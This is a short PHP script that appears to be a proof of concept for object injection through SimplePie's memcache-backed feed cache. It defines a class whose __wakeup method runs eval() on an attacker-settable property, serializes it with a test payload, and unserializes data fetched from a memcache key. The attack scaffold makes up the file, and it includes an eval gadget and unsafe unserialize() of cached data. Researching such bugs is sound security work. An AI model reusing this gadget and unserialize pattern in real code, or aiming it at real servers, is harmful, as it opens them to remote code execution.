<?php

require_once("./autoloader.php");

function get_feed($url){
    //require_once ABSPATH . '/wp-includes/class-simplepie.php';	    
    $simplepie = null;	  
    //$data = url_get_contents($url);
    if ($url) {
        $simplepie = new SimplePie();
        $simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=30&prefix=xct_');
        //$simplepie->set_raw_data($data);
        $simplepie->set_feed_url($url);
        $simplepie->init();
        $simplepie->handle_content_type();
        if ($simplepie->error) {
            error_log($simplepie->error);
            $simplepie = null;
            $failed = True;
        }
    } else {
        $failed = True;
    }
    return $simplepie;
}

$memcache_obj = memcache_connect('localhost', 11211);


class PHPObjectInjection {
    public $inject;
    function __construct() {}

    function __wakeup() {
        if(isset($this->inject)){
            eval($this->inject);
        }
    }
}

$obj = new PHPObjectInjection();
$obj->inject="echo '\npwned\n';";
$aaa = serialize($obj);
echo $aaa;
#unserialize($aaa);
echo "\n\n";
#memcache_set($memcache_obj, "aaa", $aaa);
#unserialize(memcache_get($memcache_obj, "aaa"));

echo get_feed($argv[1]);
$var = memcache_get($memcache_obj, 'xct_3ff10995ca6027c23b464aad64b7653d');
$obj = unserialize($var);
print_r($obj);
#echo $var;

?>
